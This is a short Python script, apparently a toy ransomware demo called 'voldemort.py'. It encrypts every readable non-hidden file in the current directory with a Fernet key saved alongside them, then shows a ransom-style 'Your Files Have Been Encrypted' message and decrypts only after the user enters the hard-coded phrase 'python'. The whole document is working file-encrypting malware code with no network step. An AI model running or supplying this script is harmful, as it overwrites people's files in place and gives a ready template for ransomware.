# Import some stuff
import os
from cryptography.fernet import Fernet
import subprocess
from colorama import Fore, Style
from tqdm import tqdm
import time
import random

files = []

excluded = {"voldemort.py", "thekey.key", "decrypt.py", "venv", ".git"}

# Make sure important stuff isn't encrypted
for file in os.listdir():
    if file in excluded or file.startswith('.'):
        continue

    if os.path.isfile(file):
        try:
            with open(file, "rb") as f:
                if f.read(8) == b'gAAAAAB':
                    continue  # Already encrypted
            files.append(file)
        except PermissionError:
            continue  # Skip files you don't have permission to read

# Make the key
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Encrypt the files
for file in tqdm(files, desc=Fore.RED + "Encrypting files"):
    try:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        time.sleep(random.uniform(0.5, 1.5))
    except Exception as e:
        print(Fore.YELLOW + f"Could not encrypt {file}: {e}" + Style.RESET_ALL)

secretphrase = "python"

# Tell that the files have been encrypted
print(Fore.RED + "Uh Oh! Your Files Have Been Encrypted. Enter the secret Phrase to Decrypt your Files.")
print(Fore.RED + f"Encrypted Files: {files}" + Style.RESET_ALL)

# If the guessed phrase is right decrypt the files with the decrypt.py script
userphrase = input()
while userphrase != secretphrase:
    userphrase = input(Fore.RED + "Try Again\n" + Style.RESET_ALL)

subprocess.run(["python", "decrypt.py"])
print("Congrats, Your Files Have Been Decrypted!")

